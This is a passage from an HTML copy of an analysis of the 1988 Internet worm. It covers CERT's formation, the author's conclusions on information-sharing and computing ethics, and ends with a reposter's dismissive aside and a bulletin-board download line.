  CERT-like groups. This, of course, may make it difficult to coordinate<br>
  effective action and communication during the next threat. It may even<br>
  introduce rivalry in the development and dissemination of critical<br>
  information.<br>
  <br>
  Also of interest is the composition of the personnel CERT is enlisting as<br>
  volunteers. Apparently there has been little or no solicitation of expertise<br>
  among the industrial and academic computing communities. This is precisely<br>
  where the solution to the worm originated. The effectiveness of this<br>
  organization against the next Internet-wide crisis will be interesting to<br>
  note.<br>
  <br>
  <font color="#00CCFF"><b>CONCLUSIONS</b></font><br>
  <br>
  All the consequences of the Internet worm incident are not yet known; they<br>
  may never be. Most likely there will be changes in security consciousness<br>
  for at least a short period of time. There may also be new laws and new<br>
  regulations from the agencies governing access to the Internet. Vendors may<br>
  change the way they test and market their products--and not all of the<br>
  possible changes will be advantageous to the end-user (e.g., removing the<br>
  machine/host equivalence feature for remote execution). Users' interactions<br>
  with their systems may change as well. It is also possible that no<br>
  significant change will occur anywhere. The final benefit or harm of the<br>
  incident will only become clear with the passage of time.<br>
  <br>
  It is important to note that the nature of both the Internet and UNIX helped<br>
  to defeat the worm as well as spread it. The immediacy of communication, the<br>
  ability to copy source and binary files from machine to machine, and the<br>
  widespread availability of both source and expertise allowed personnel<br>
  throughout the country to work together to solve the infection despite the<br>
  widespread disconnection of parts of the network. Although the immediate<br>
  reaction of some people might be to restrict communication or promote a<br>
  diversity of incompatible software options to prevent a recurrence of a worm,<br>
  that would be an inappropriate reaction. Increasing the obstacles to open<br>
  communication or decreasing the number of people with access to in-depth<br>
  information will not prevent a determined hacker--it will only decrease the<br>
  pool of expertise and resources available to fight such an attack. Further,<br>
  such an attitude would be contrary to the whole purpose of having an open,<br>
  research-oriented network. The worm was caused by a breakdown of ethics as<br>
  well as lapses in security--a purely technological attempt at prevention will<br>
  not address the full problem, and may just cause new difficulties.<br>
  <br>
  What we learn from this about securing our systems will help determine if<br>
  this is the only such incident we ever need to analyze. This attack should<br>
  also point out that we need a better mechanism in place to coordinate<br>
  information about security flaws and attacks. The response to this incident<br>
  was largely ad hoc, and resulted in both duplication of effort and a failure<br>
  to disseminate valuable information to sites that needed it. Many site<br>
  administrators discovered the problem from reading newspapers or watching<br>
  television. The major sources of information for many of the sites affected<br>
  seems to have been Usenet news groups and a mailing list I put together when<br>
  the worm was first discovered. Although useful, these methods did not ensure<br>
  timely, widespread dissemination of useful information--especially since they<br>
  depended on the Internet to work! Over three weeks after this incident some<br>
  sites were still not reconnected to the Internet. The worm has shown us that<br>
  we are all affected by events in our shared environment, and we need to<br>
  develop better information methods outside the network before the next<br>
  crisis. The formation of the CERT may be a step in the right direction, but<br>
  a more general solution is still needed.<br>
  <br>
  Finally, this whole episode should prompt us to think about the ethics and<br>
  laws concerning access to computers. The technology we use has developed so<br>
  quickly it is not always easy to determine where the proper boundaries of<br>
  moral action should be. Some senior computer professionals started their<br>
  careers years ago by breaking into computer systems at their colleges and<br>
  places of employment to demonstrate their expertise and knowledge of the<br>
  inner workings of the systems. However, times have changed and mastery of<br>
  computer science and computer engineering now involves a great deal more than<br>
  can be shown by using intimate knowledge of the flaws in a particular<br>
  operating system. Whether such actions were appropriate fifteen years ago<br>
  is, in some senses, unimportant. I believe it is critical to realize that<br>
  such behavior is clearly inappropriate now. Entire businesses are now<br>
  dependent, wisely or not, on the undisturbed functioning of computers. Many<br>
  people's careers, property, and lives may be placed in jeopardy by acts of<br>
  computer sabotage and mischief.<br>
  <br>
  As a society, we cannot afford the consequences of such actions. As<br>
  professionals, computer scientists and computer engineers cannot afford to<br>
  tolerate the romanticization of computer vandals and computer criminals, and<br>
  we must take the lead by setting proper examples. Let us hope there are no<br>
  further incidents to underscore this lesson.<br>
  <br>
  {Pretty cool except for those last two paragraphs of BS huh?}<br>
  <br>
  Downloaded From P-80 International Information Systems 304-744-2253</font></p>
<p><br>
</p>
</body>
</html>
